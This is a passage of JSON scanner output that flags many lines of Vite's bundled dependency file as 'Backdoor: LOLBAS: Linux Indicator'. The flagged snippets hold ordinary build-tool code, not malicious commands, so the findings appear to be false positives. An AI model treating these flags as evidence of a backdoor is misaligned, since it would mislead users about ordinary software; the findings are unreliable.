                    "text": "\t * Returns true if the given brace node should be enclosed in literal braces\n\t */\n\n\texports.encloseBrace = node => {\n\t  if (node.type !== 'brace') return false;\n\t  if ((node.commas >> 0 + node.ranges >> 0) === 0) {\n\t    node.invalid = true;\n",
                    "rendered": {
                      "text": "\t * Returns true if the given brace node should be enclosed in literal braces\n\t */\n\n\texports.encloseBrace = node => {\n\t  if (node.type !== 'brace') return false;\n\t  if ((node.commas >> 0 + node.ranges >> 0) === 0) {\n\t    node.invalid = true;\n",
                      "markdown": "`\t * Returns true if the given brace node should be enclosed in literal braces\n\t */\n\n\texports.encloseBrace = node => {\n\t  if (node.type !== 'brace') return false;\n\t  if ((node.commas >> 0 + node.ranges >> 0) === 0) {\n\t    node.invalid = true;\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 21369,
                  "startColumn": 8,
                  "endLine": 21369,
                  "endColumn": 14,
                  "snippet": {
                    "text": "\t */\n\n\texports.escapeNode = (block, n = 0, type) => {\n\t  const node = block.nodes[n];\n\t  if (!node) return;\n\n\t  if ((type && node.type === type) || node.type === 'open' || node.type === 'close') {\n",
                    "rendered": {
                      "text": "\t */\n\n\texports.escapeNode = (block, n = 0, type) => {\n\t  const node = block.nodes[n];\n\t  if (!node) return;\n\n\t  if ((type && node.type === type) || node.type === 'open' || node.type === 'close') {\n",
                      "markdown": "`\t */\n\n\texports.escapeNode = (block, n = 0, type) => {\n\t  const node = block.nodes[n];\n\t  if (!node) return;\n\n\t  if ((type && node.type === type) || node.type === 'open' || node.type === 'close') {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 20625,
                  "startColumn": 21,
                  "endLine": 20625,
                  "endColumn": 29,
                  "snippet": {
                    "text": "        );\n      }\n      const base64 = format && base64RE.test(format.substring(1));\n      const content = base64 ? Buffer.from(data, \"base64\").toString(\"utf-8\") : data;\n      resolved.set(id, content);\n      return dataUriPrefix + id;\n    },\n",
                    "rendered": {
                      "text": "        );\n      }\n      const base64 = format && base64RE.test(format.substring(1));\n      const content = base64 ? Buffer.from(data, \"base64\").toString(\"utf-8\") : data;\n      resolved.set(id, content);\n      return dataUriPrefix + id;\n    },\n",
                      "markdown": "`        );\n      }\n      const base64 = format && base64RE.test(format.substring(1));\n      const content = base64 ? Buffer.from(data, \"base64\").toString(\"utf-8\") : data;\n      resolved.set(id, content);\n      return dataUriPrefix + id;\n    },\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 20624,
                  "startColumn": 11,
                  "endLine": 20624,
                  "endColumn": 19,
                  "snippet": {
                    "text": "          `data URI with non-JavaScript mime type is not supported. If you're using legacy JavaScript MIME types (such as 'application/javascript'), please use 'text/javascript' instead.`\n        );\n      }\n      const base64 = format && base64RE.test(format.substring(1));\n      const content = base64 ? Buffer.from(data, \"base64\").toString(\"utf-8\") : data;\n      resolved.set(id, content);\n      return dataUriPrefix + id;\n",
                    "rendered": {
                      "text": "          `data URI with non-JavaScript mime type is not supported. If you're using legacy JavaScript MIME types (such as 'application/javascript'), please use 'text/javascript' instead.`\n        );\n      }\n      const base64 = format && base64RE.test(format.substring(1));\n      const content = base64 ? Buffer.from(data, \"base64\").toString(\"utf-8\") : data;\n      resolved.set(id, content);\n      return dataUriPrefix + id;\n",
                      "markdown": "`          `data URI with non-JavaScript mime type is not supported. If you're using legacy JavaScript MIME types (such as 'application/javascript'), please use 'text/javascript' instead.`\n        );\n      }\n      const base64 = format && base64RE.test(format.substring(1));\n      const content = base64 ? Buffer.from(data, \"base64\").toString(\"utf-8\") : data;\n      resolved.set(id, content);\n      return dataUriPrefix + id;\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 20402,
                  "startColumn": 66,
                  "endLine": 20402,
                  "endColumn": 71,
                  "snippet": {
                    "text": "  if (shouldInline(config, file, id, content, pluginContext, forceInline)) {\n    if (config.build.lib && isGitLfsPlaceholder(content)) {\n      config.logger.warn(\n        colors$1.yellow(`Inlined file ${id} was not downloaded via Git LFS`)\n      );\n    }\n    if (file.endsWith(\".svg\")) {\n",
                    "rendered": {
                      "text": "  if (shouldInline(config, file, id, content, pluginContext, forceInline)) {\n    if (config.build.lib && isGitLfsPlaceholder(content)) {\n      config.logger.warn(\n        colors$1.yellow(`Inlined file ${id} was not downloaded via Git LFS`)\n      );\n    }\n    if (file.endsWith(\".svg\")) {\n",
                      "markdown": "`  if (shouldInline(config, file, id, content, pluginContext, forceInline)) {\n    if (config.build.lib && isGitLfsPlaceholder(content)) {\n      config.logger.warn(\n        colors$1.yellow(`Inlined file ${id} was not downloaded via Git LFS`)\n      );\n    }\n    if (file.endsWith(\".svg\")) {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 17636,
                  "startColumn": 17,
                  "endLine": 17636,
                  "endColumn": 23,
                  "snippet": {
                    "text": "    return `${time.toFixed(2)}s`;\n  }\n  const mins = parseInt((time / 60).toString());\n  const seconds = time % 60;\n  return `${mins}m${seconds < 1 ? \"\" : ` ${seconds.toFixed(0)}s`}`;\n}\nfunction encodeURIPath(uri) {\n",
                    "rendered": {
                      "text": "    return `${time.toFixed(2)}s`;\n  }\n  const mins = parseInt((time / 60).toString());\n  const seconds = time % 60;\n  return `${mins}m${seconds < 1 ? \"\" : ` ${seconds.toFixed(0)}s`}`;\n}\nfunction encodeURIPath(uri) {\n",
                      "markdown": "`    return `${time.toFixed(2)}s`;\n  }\n  const mins = parseInt((time / 60).toString());\n  const seconds = time % 60;\n  return `${mins}m${seconds < 1 ? \"\" : ` ${seconds.toFixed(0)}s`}`;\n}\nfunction encodeURIPath(uri) {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 17631,
                  "startColumn": 8,
                  "endLine": 17631,
                  "endColumn": 14,
                  "snippet": {
                    "text": "  if (time < 1e3) {\n    return `${time}ms`;\n  }\n  time = time / 1e3;\n  if (time < 60) {\n    return `${time.toFixed(2)}s`;\n  }\n",
                    "rendered": {
                      "text": "  if (time < 1e3) {\n    return `${time}ms`;\n  }\n  time = time / 1e3;\n  if (time < 60) {\n    return `${time.toFixed(2)}s`;\n  }\n",
                      "markdown": "`  if (time < 1e3) {\n    return `${time}ms`;\n  }\n  time = time / 1e3;\n  if (time < 60) {\n    return `${time.toFixed(2)}s`;\n  }\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 17631,
                  "startColumn": 1,
                  "endLine": 17631,
                  "endColumn": 7,
                  "snippet": {
                    "text": "  if (time < 1e3) {\n    return `${time}ms`;\n  }\n  time = time / 1e3;\n  if (time < 60) {\n    return `${time.toFixed(2)}s`;\n  }\n",
                    "rendered": {
                      "text": "  if (time < 1e3) {\n    return `${time}ms`;\n  }\n  time = time / 1e3;\n  if (time < 60) {\n    return `${time.toFixed(2)}s`;\n  }\n",
                      "markdown": "`  if (time < 1e3) {\n    return `${time}ms`;\n  }\n  time = time / 1e3;\n  if (time < 60) {\n    return `${time.toFixed(2)}s`;\n  }\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 17481,
                  "startColumn": 3,
                  "endLine": 17481,
                  "endColumn": 9,
                  "snippet": {
                    "text": "  customResolver\n}) {\n  if (typeof find === \"string\" && find[find.length - 1] === \"/\" && replacement[replacement.length - 1] === \"/\") {\n    find = find.slice(0, find.length - 1);\n    replacement = replacement.slice(0, replacement.length - 1);\n  }\n  const alias = {\n",
                    "rendered": {
                      "text": "  customResolver\n}) {\n  if (typeof find === \"string\" && find[find.length - 1] === \"/\" && replacement[replacement.length - 1] === \"/\") {\n    find = find.slice(0, find.length - 1);\n    replacement = replacement.slice(0, replacement.length - 1);\n  }\n  const alias = {\n",
                      "markdown": "`  customResolver\n}) {\n  if (typeof find === \"string\" && find[find.length - 1] === \"/\" && replacement[replacement.length - 1] === \"/\") {\n    find = find.slice(0, find.length - 1);\n    replacement = replacement.slice(0, replacement.length - 1);\n  }\n  const alias = {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 17480,
                  "startColumn": 12,
                  "endLine": 17480,
                  "endColumn": 18,
                  "snippet": {
                    "text": "  replacement,\n  customResolver\n}) {\n  if (typeof find === \"string\" && find[find.length - 1] === \"/\" && replacement[replacement.length - 1] === \"/\") {\n    find = find.slice(0, find.length - 1);\n    replacement = replacement.slice(0, replacement.length - 1);\n  }\n",
                    "rendered": {
                      "text": "  replacement,\n  customResolver\n}) {\n  if (typeof find === \"string\" && find[find.length - 1] === \"/\" && replacement[replacement.length - 1] === \"/\") {\n    find = find.slice(0, find.length - 1);\n    replacement = replacement.slice(0, replacement.length - 1);\n  }\n",
                      "markdown": "`  replacement,\n  customResolver\n}) {\n  if (typeof find === \"string\" && find[find.length - 1] === \"/\" && replacement[replacement.length - 1] === \"/\") {\n    find = find.slice(0, find.length - 1);\n    replacement = replacement.slice(0, replacement.length - 1);\n  }\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 17179,
                  "startColumn": 29,
                  "endLine": 17179,
                  "endColumn": 36,
                  "snippet": {
                    "text": "  });\n}\nfunction ensureWatchedFile(watcher, file, root) {\n  if (file && // only need to watch if out of root\n  !file.startsWith(withTrailingSlash(root)) && // some rollup plugins use null bytes for private resolved Ids\n  !file.includes(\"\\0\") && fs__default.existsSync(file)) {\n    watcher.add(path$n.resolve(file));\n",
                    "rendered": {
                      "text": "  });\n}\nfunction ensureWatchedFile(watcher, file, root) {\n  if (file && // only need to watch if out of root\n  !file.startsWith(withTrailingSlash(root)) && // some rollup plugins use null bytes for private resolved Ids\n  !file.includes(\"\\0\") && fs__default.existsSync(file)) {\n    watcher.add(path$n.resolve(file));\n",
                      "markdown": "`  });\n}\nfunction ensureWatchedFile(watcher, file, root) {\n  if (file && // only need to watch if out of root\n  !file.startsWith(withTrailingSlash(root)) && // some rollup plugins use null bytes for private resolved Ids\n  !file.includes(\"\\0\") && fs__default.existsSync(file)) {\n    watcher.add(path$n.resolve(file));\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 16900,
                  "startColumn": 7,
                  "endLine": 16900,
                  "endColumn": 13,
                  "snippet": {
                    "text": "  return rewritten;\n}\nfunction timeFrom(start, subtract = 0) {\n  const time = performance$1.now() - start - subtract;\n  const timeString = (time.toFixed(2) + `ms`).padEnd(5, \" \");\n  if (time < 10) {\n    return colors$1.green(timeString);\n",
                    "rendered": {
                      "text": "  return rewritten;\n}\nfunction timeFrom(start, subtract = 0) {\n  const time = performance$1.now() - start - subtract;\n  const timeString = (time.toFixed(2) + `ms`).padEnd(5, \" \");\n  if (time < 10) {\n    return colors$1.green(timeString);\n",
                      "markdown": "`  return rewritten;\n}\nfunction timeFrom(start, subtract = 0) {\n  const time = performance$1.now() - start - subtract;\n  const timeString = (time.toFixed(2) + `ms`).padEnd(5, \" \");\n  if (time < 10) {\n    return colors$1.green(timeString);\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 14115,
                  "startColumn": 12,
                  "endLine": 14115,
                  "endColumn": 18,
                  "snippet": {
                    "text": "      storeName: true\n    });\n  }\n  for (const node of replacedDynamicRequires) {\n    magicString.overwrite(\n      node.start,\n      node.end,\n",
                    "rendered": {
                      "text": "      storeName: true\n    });\n  }\n  for (const node of replacedDynamicRequires) {\n    magicString.overwrite(\n      node.start,\n      node.end,\n",
                      "markdown": "`      storeName: true\n    });\n  }\n  for (const node of replacedDynamicRequires) {\n    magicString.overwrite(\n      node.start,\n      node.end,\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 14110,
                  "startColumn": 12,
                  "endLine": 14110,
                  "endColumn": 18,
                  "snippet": {
                    "text": "    deconflictedExportNames[exportName] = deconflict([...scopes], globals, exportName);\n  }\n\n  for (const node of replacedGlobal) {\n    magicString.overwrite(node.start, node.end, `${helpersName}.commonjsGlobal`, {\n      storeName: true\n    });\n",
                    "rendered": {
                      "text": "    deconflictedExportNames[exportName] = deconflict([...scopes], globals, exportName);\n  }\n\n  for (const node of replacedGlobal) {\n    magicString.overwrite(node.start, node.end, `${helpersName}.commonjsGlobal`, {\n      storeName: true\n    });\n",
                      "markdown": "`    deconflictedExportNames[exportName] = deconflict([...scopes], globals, exportName);\n  }\n\n  for (const node of replacedGlobal) {\n    magicString.overwrite(node.start, node.end, `${helpersName}.commonjsGlobal`, {\n      storeName: true\n    });\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 13150,
                  "startColumn": 3,
                  "endLine": 13150,
                  "endColumn": 9,
                  "snippet": {
                    "text": "\n    parts.unshift(node.property.name);\n    // eslint-disable-next-line no-param-reassign\n    node = node.object;\n  }\n\n  if (node.type !== 'Identifier') return null;\n",
                    "rendered": {
                      "text": "\n    parts.unshift(node.property.name);\n    // eslint-disable-next-line no-param-reassign\n    node = node.object;\n  }\n\n  if (node.type !== 'Identifier') return null;\n",
                      "markdown": "`\n    parts.unshift(node.property.name);\n    // eslint-disable-next-line no-param-reassign\n    node = node.object;\n  }\n\n  if (node.type !== 'Identifier') return null;\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 12286,
                  "startColumn": 12,
                  "endLine": 12286,
                  "endColumn": 18,
                  "snippet": {
                    "text": "  let hasDefaultExport = false;\n  let hasNamedExports = false;\n\n  for (const node of ast.body) {\n    switch (node.type) {\n      case 'ExportDefaultDeclaration':\n        isEsModule = true;\n",
                    "rendered": {
                      "text": "  let hasDefaultExport = false;\n  let hasNamedExports = false;\n\n  for (const node of ast.body) {\n    switch (node.type) {\n      case 'ExportDefaultDeclaration':\n        isEsModule = true;\n",
                      "markdown": "`  let hasDefaultExport = false;\n  let hasNamedExports = false;\n\n  for (const node of ast.body) {\n    switch (node.type) {\n      case 'ExportDefaultDeclaration':\n        isEsModule = true;\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 12242,
                  "startColumn": 42,
                  "endLine": 12242,
                  "endColumn": 48,
                  "snippet": {
                    "text": "            // disregard the `bar` in `export { foo as bar }` or\n            // the foo in `import { foo as bar }`\n            case 'ExportSpecifier':\n            case 'ImportSpecifier': return node === parent.local;\n            // disregard the `foo` in `foo: while (...) { ... break foo; ... continue foo;}`\n            case 'LabeledStatement':\n            case 'BreakStatement':\n",
                    "rendered": {
                      "text": "            // disregard the `bar` in `export { foo as bar }` or\n            // the foo in `import { foo as bar }`\n            case 'ExportSpecifier':\n            case 'ImportSpecifier': return node === parent.local;\n            // disregard the `foo` in `foo: while (...) { ... break foo; ... continue foo;}`\n            case 'LabeledStatement':\n            case 'BreakStatement':\n",
                      "markdown": "`            // disregard the `bar` in `export { foo as bar }` or\n            // the foo in `import { foo as bar }`\n            case 'ExportSpecifier':\n            case 'ImportSpecifier': return node === parent.local;\n            // disregard the `foo` in `foo: while (...) { ... break foo; ... continue foo;}`\n            case 'LabeledStatement':\n            case 'BreakStatement':\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 12238,
                  "startColumn": 54,
                  "endLine": 12238,
                  "endColumn": 60,
                  "snippet": {
                    "text": "            // disregard the `foo` in `class {foo=bar}` but keep it in `class {[foo]=bar}` and `class {bar=foo}`\n            case 'FieldDefinition': return parent.computed || node === parent.value;\n            // disregard the `bar` in `{ bar: foo }`, but keep it in `{ [bar]: foo }`\n            case 'Property': return parent.computed || node === parent.value;\n            // disregard the `bar` in `export { foo as bar }` or\n            // the foo in `import { foo as bar }`\n            case 'ExportSpecifier':\n",
                    "rendered": {
                      "text": "            // disregard the `foo` in `class {foo=bar}` but keep it in `class {[foo]=bar}` and `class {bar=foo}`\n            case 'FieldDefinition': return parent.computed || node === parent.value;\n            // disregard the `bar` in `{ bar: foo }`, but keep it in `{ [bar]: foo }`\n            case 'Property': return parent.computed || node === parent.value;\n            // disregard the `bar` in `export { foo as bar }` or\n            // the foo in `import { foo as bar }`\n            case 'ExportSpecifier':\n",
                      "markdown": "`            // disregard the `foo` in `class {foo=bar}` but keep it in `class {[foo]=bar}` and `class {bar=foo}`\n            case 'FieldDefinition': return parent.computed || node === parent.value;\n            // disregard the `bar` in `{ bar: foo }`, but keep it in `{ [bar]: foo }`\n            case 'Property': return parent.computed || node === parent.value;\n            // disregard the `bar` in `export { foo as bar }` or\n            // the foo in `import { foo as bar }`\n            case 'ExportSpecifier':\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 12236,
                  "startColumn": 61,
                  "endLine": 12236,
                  "endColumn": 67,
                  "snippet": {
                    "text": "            // disregard the `foo` in `class {foo(){}}` but keep it in `class {[foo](){}}`\n            case 'MethodDefinition': return parent.computed;\n            // disregard the `foo` in `class {foo=bar}` but keep it in `class {[foo]=bar}` and `class {bar=foo}`\n            case 'FieldDefinition': return parent.computed || node === parent.value;\n            // disregard the `bar` in `{ bar: foo }`, but keep it in `{ [bar]: foo }`\n            case 'Property': return parent.computed || node === parent.value;\n            // disregard the `bar` in `export { foo as bar }` or\n",
                    "rendered": {
                      "text": "            // disregard the `foo` in `class {foo(){}}` but keep it in `class {[foo](){}}`\n            case 'MethodDefinition': return parent.computed;\n            // disregard the `foo` in `class {foo=bar}` but keep it in `class {[foo]=bar}` and `class {bar=foo}`\n            case 'FieldDefinition': return parent.computed || node === parent.value;\n            // disregard the `bar` in `{ bar: foo }`, but keep it in `{ [bar]: foo }`\n            case 'Property': return parent.computed || node === parent.value;\n            // disregard the `bar` in `export { foo as bar }` or\n",
                      "markdown": "`            // disregard the `foo` in `class {foo(){}}` but keep it in `class {[foo](){}}`\n            case 'MethodDefinition': return parent.computed;\n            // disregard the `foo` in `class {foo=bar}` but keep it in `class {[foo]=bar}` and `class {bar=foo}`\n            case 'FieldDefinition': return parent.computed || node === parent.value;\n            // disregard the `bar` in `{ bar: foo }`, but keep it in `{ [bar]: foo }`\n            case 'Property': return parent.computed || node === parent.value;\n            // disregard the `bar` in `export { foo as bar }` or\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 12232,
                  "startColumn": 62,
                  "endLine": 12232,
                  "endColumn": 68,
                  "snippet": {
                    "text": "            return true;\n        switch (parent.type) {\n            // disregard `bar` in `foo.bar`\n            case 'MemberExpression': return parent.computed || node === parent.object;\n            // disregard the `foo` in `class {foo(){}}` but keep it in `class {[foo](){}}`\n            case 'MethodDefinition': return parent.computed;\n            // disregard the `foo` in `class {foo=bar}` but keep it in `class {[foo]=bar}` and `class {bar=foo}`\n",
                    "rendered": {
                      "text": "            return true;\n        switch (parent.type) {\n            // disregard `bar` in `foo.bar`\n            case 'MemberExpression': return parent.computed || node === parent.object;\n            // disregard the `foo` in `class {foo(){}}` but keep it in `class {[foo](){}}`\n            case 'MethodDefinition': return parent.computed;\n            // disregard the `foo` in `class {foo=bar}` but keep it in `class {[foo]=bar}` and `class {bar=foo}`\n",
                      "markdown": "`            return true;\n        switch (parent.type) {\n            // disregard `bar` in `foo.bar`\n            case 'MemberExpression': return parent.computed || node === parent.object;\n            // disregard the `foo` in `class {foo(){}}` but keep it in `class {[foo](){}}`\n            case 'MethodDefinition': return parent.computed;\n            // disregard the `foo` in `class {foo=bar}` but keep it in `class {[foo]=bar}` and `class {bar=foo}`\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 5972,
                  "startColumn": 13,
                  "endLine": 5972,
                  "endColumn": 19,
                  "snippet": {
                    "text": "        }\n    }\n    #evict(free) {\n        const head = this.#head;\n        const k = this.#keyList[head];\n        const v = this.#valList[head];\n        if (this.#hasFetchMethod && this.#isBackgroundFetch(v)) {\n",
                    "rendered": {
                      "text": "        }\n    }\n    #evict(free) {\n        const head = this.#head;\n        const k = this.#keyList[head];\n        const v = this.#valList[head];\n        if (this.#hasFetchMethod && this.#isBackgroundFetch(v)) {\n",
                      "markdown": "`        }\n    }\n    #evict(free) {\n        const head = this.#head;\n        const k = this.#keyList[head];\n        const v = this.#valList[head];\n        if (this.#hasFetchMethod && this.#isBackgroundFetch(v)) {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 4458,
                  "startColumn": 23,
                  "endLine": 4458,
                  "endColumn": 27,
                  "snippet": {
                    "text": "                        parts.splice(dd - 1, 2, ...splin);\n                        if (parts.length === 0)\n                            parts.push('');\n                        dd -= 2;\n                    }\n                }\n            }\n",
                    "rendered": {
